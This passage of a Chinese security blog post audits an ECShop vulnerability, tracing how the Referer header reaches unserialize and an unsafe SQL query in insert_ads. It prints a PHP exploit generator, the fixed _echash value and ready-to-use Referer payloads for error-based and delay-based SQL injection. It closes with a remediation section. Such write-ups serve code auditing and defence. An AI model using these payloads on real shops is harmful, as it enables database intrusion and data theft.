class="hljs-keyword">else</span><br>           &#123;<br>               <span class="hljs-variable">$source</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>               <span class="hljs-variable">$expires</span> = <span class="hljs-number">0</span>;<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;force_compile || <span class="hljs-variable">$filestat</span>[<span class="hljs-string">&#x27;mtime&#x27;</span>] &gt; <span class="hljs-variable">$expires</span>)<br>       &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;_current_file = <span class="hljs-variable">$filename</span>;<br>           <span class="hljs-variable">$source</span> = <span class="hljs-keyword">$this</span>-&gt;fetch_str(file_get_contents(<span class="hljs-variable">$filename</span>));<br><br>           <span class="hljs-keyword">if</span> (file_put_contents(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$source</span>, LOCK_EX) === <span class="hljs-literal">false</span>)<br>           &#123;<br>               trigger_error(<span class="hljs-string">&#x27;can\&#x27;t write:&#x27;</span> . <span class="hljs-variable">$name</span>);<br>           &#125;<br><br>           <span class="hljs-variable">$source</span> = <span class="hljs-keyword">$this</span>-&gt;_eval(<span class="hljs-variable">$source</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$source</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>make_complied方法会将模板中的变量解析，然后返回到display()函数中。</p>
+<p>我们继续跟进user_passport.dwt，查找<code>$back_act</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;act&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;act_login&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;back_act&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;$back_act&#125;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;us_Submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>也就是说fetch函数最终会返回一个解析过后的变量</p>
+<p>我们继续关注display()函数中的如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$out</span>, <span class="hljs-keyword">$this</span>-&gt;_echash) !== <span class="hljs-literal">false</span>)<br>        &#123;<br>            <span class="hljs-variable">$k</span> = explode(<span class="hljs-keyword">$this</span>-&gt;_echash, <span class="hljs-variable">$out</span>);<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$k</span> <span class="hljs-keyword">AS</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$key</span> % <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>)<br>                &#123;<br>                    <span class="hljs-variable">$k</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-keyword">$this</span>-&gt;insert_mod(<span class="hljs-variable">$val</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable">$out</span> = implode(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>);<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>此处判断解析后的内容中是否含有<code>_echash</code>，如果存在则分割内容，并用insert_mod处理</p>
+<p><img   class="lazyload" data-original="https://md.buptmerak.cn/uploads/upload_115e04ee3437e9451a7debb2bbef41ea.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>而此处的echash是一个定值，所以我们可以控制insert_mod的参数</p>
+<p>继续跟进insert_mod</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_mod</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) // 处理动态内容</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$fun</span>, <span class="hljs-variable">$para</span>) = explode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$para</span> = unserialize(<span class="hljs-variable">$para</span>);<br>    <span class="hljs-variable">$fun</span> = <span class="hljs-string">&#x27;insert_&#x27;</span> . <span class="hljs-variable">$fun</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$fun</span>(<span class="hljs-variable">$para</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>$val</code>传递进来，先用 | 分割，得到 <code>$fun</code>和 <code>$para</code>，<code>$para</code>进行反序列操作，<code>$fun</code> 和 <code>insert_</code> 拼接，最后动态调用 <code>$fun($para)</code>，函数名部分可控，参数完全可控。接下来就是寻找以 <code>insert_</code>开头的可利用的函数了，在 /includes/lib_insert.php 有一个 insert_ads() 函数，正好满足要求。</p>
+<p>跟进insert_ads() 函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_ads</span>(<span class="hljs-params"><span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-variable">$static_res</span> = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-variable">$time</span> = gmtime();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;num&#x27;</span>] != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-variable">$sql</span>  = <span class="hljs-string">&#x27;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#x27;</span> .<br>                    <span class="hljs-string">&#x27;p.ad_height, p.position_style, RAND() AS rnd &#x27;</span> .<br>                <span class="hljs-string">&#x27;FROM &#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="hljs-string">&#x27;ad&#x27;</span>) . <span class="hljs-string">&#x27; AS a &#x27;</span>.<br>                <span class="hljs-string">&#x27;LEFT JOIN &#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="hljs-string">&#x27;ad_position&#x27;</span>) . <span class="hljs-string">&#x27; AS p ON a.position_id = p.position_id &#x27;</span> .<br>                <span class="hljs-string">&quot;WHERE enabled = 1 AND start_time &lt;= &#x27;&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;&#x27; AND end_time &gt;= &#x27;&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;&#x27; &quot;</span>.<br>                    <span class="hljs-string">&quot;AND a.position_id = &#x27;&quot;</span> . <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;id&#x27;</span>] . <span class="hljs-string">&quot;&#x27; &quot;</span> .<br>                <span class="hljs-string">&#x27;ORDER BY rnd LIMIT &#x27;</span> . <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;db&#x27;</span>]-&gt;GetAll(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$static_res</span>[<span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;id&#x27;</span>]] === <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-variable">$sql</span>  = <span class="hljs-string">&#x27;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#x27;</span>.<br>                        <span class="hljs-string">&#x27;p.ad_height, p.position_style, RAND() AS rnd &#x27;</span> .<br>                    <span class="hljs-string">&#x27;FROM &#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="hljs-string">&#x27;ad&#x27;</span>) . <span class="hljs-string">&#x27; AS a &#x27;</span>.<br>                    <span class="hljs-string">&#x27;LEFT JOIN &#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="hljs-string">&#x27;ad_position&#x27;</span>) . <span class="hljs-string">&#x27; AS p ON a.position_id = p.position_id &#x27;</span> .<br>                    <span class="hljs-string">&quot;WHERE enabled = 1 AND a.position_id = &#x27;&quot;</span> . <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;id&#x27;</span>] .<br>                        <span class="hljs-string">&quot;&#x27; AND start_time &lt;= &#x27;&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;&#x27; AND end_time &gt;= &#x27;&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;&#x27; &quot;</span> .<br>                    <span class="hljs-string">&#x27;ORDER BY rnd LIMIT 1&#x27;</span>;<br>            <span class="hljs-variable">$static_res</span>[<span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;id&#x27;</span>]] = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;db&#x27;</span>]-&gt;GetAll(<span class="hljs-variable">$sql</span>);<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$static_res</span>[<span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<br>    &#125;<br>    <span class="hljs-variable">$ads</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-variable">$position_style</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>此处可以看到SQL语句，又结合之前的分析，参数可控，故而可以进行SQL注入攻击</p>
+<p>最后得到payload模板</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">_echash+fun|serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;num&quot;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&quot;id&quot;</span>=&gt;payload))<br></code></pre></td></tr></table></figure>
+
+<p>写出对应的漏洞利用脚本(exp)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$s</span>=<span class="hljs-string">&quot;Referer:554fcae493e564ee0dc75bdf2ebf94caads|&quot;</span>;<br><span class="hljs-variable">$exparray</span>=<span class="hljs-keyword">array</span>(<span class="hljs-comment">//自定义id来构造payload</span><br>	<span class="hljs-string">&quot;num&quot;</span>=&gt;<span class="hljs-number">1</span>,<br>	<span class="hljs-string">&quot;id&quot;</span>=&gt;payload<br>);<br><span class="hljs-variable">$payload</span>=<span class="hljs-variable">$s</span>.serialize(<span class="hljs-variable">$exparray</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="攻击载荷测试"><a href="#攻击载荷测试" class="headerlink" title="攻击载荷测试"></a>攻击载荷测试</h2><p>该注入实质上是一个Http请求头注入，得到payload后替换请求头中的Referer参数进行注入</p>
+<p>下面我们尝试来构造几个payload</p>
+<p>报错注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Referer:<span class="hljs-number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;num&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">58</span>:<span class="hljs-string">&quot;1&#x27; and updatexml(1,make_set(3,&#x27;~&#x27;,(select database())),1)#&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="https://md.buptmerak.cn/uploads/upload_80f6bbb5540761a63c2fdbaf197a3caa.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>报错注入+笛卡尔积注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Referer:<span class="hljs-number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;num&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">149</span>:<span class="hljs-string">&quot;1&#x27; and updatexml(1,make_set(3,&#x27;~&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C)),1)#&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在sleep函数不可用时，可以使用查询笛卡尔积的方式来一次进行大量查询，这样就会因为大量查询导致返回报文延迟，达到与时间盲注类似的效果</p>
+<p>（使用笛卡尔积注入的攻击载荷后响应明显变慢，笔者等了半天都没等到返回包）</p>
+<p><img   class="lazyload" data-original="https://md.buptmerak.cn/uploads/upload_d9726b35b25fddd592ea713824f76a5a.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><h2 id="漏洞梳理"><a href="#漏洞梳理" class="headerlink" title="漏洞梳理"></a>漏洞梳理</h2><p>首先，referer值未加判断直接引用,可被攻击者控制输入</p>
+<p>其次，用_echash = “554fcae493e564ee0dc75bdf2ebf94ca” 为定值进行切分，构造payload</p>
+<p>然后，利用反序列化漏洞,构造payload，传输恶意代码</p>
+<p>最后，insert_ads函数的SQL拼接不规范导致存在SQL注入</p>
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>除了常规的预编译、对用户输入进行过滤以外，此处其实还有一个更简便的修复方法</p>
+<p>攻击者能够成功进行攻击需要echash，而这个值是定值，导致攻击者能够直接从网络上对应版本的源码中得到该值，故而可以通过修改文件中echash的值来达到防御攻击的目的</p>
+<p>该修复方法经笔者测试有效(😅上次AWD就是这么修的)</p>
+
+      </section>
+      <section class="extra">
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2021/11/11/MimicDefence/">强网拟态划水实录<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ECshop%E7%AE%80%E4%BB%8B"><span class="toc-text">ECshop简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%B5%8B%E8%AF%95"><span class="toc-text">攻击载荷测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86"><span class="toc-text">漏洞梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-text">修复方法</span></a></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=3067733270 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="mailto:3067733270@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
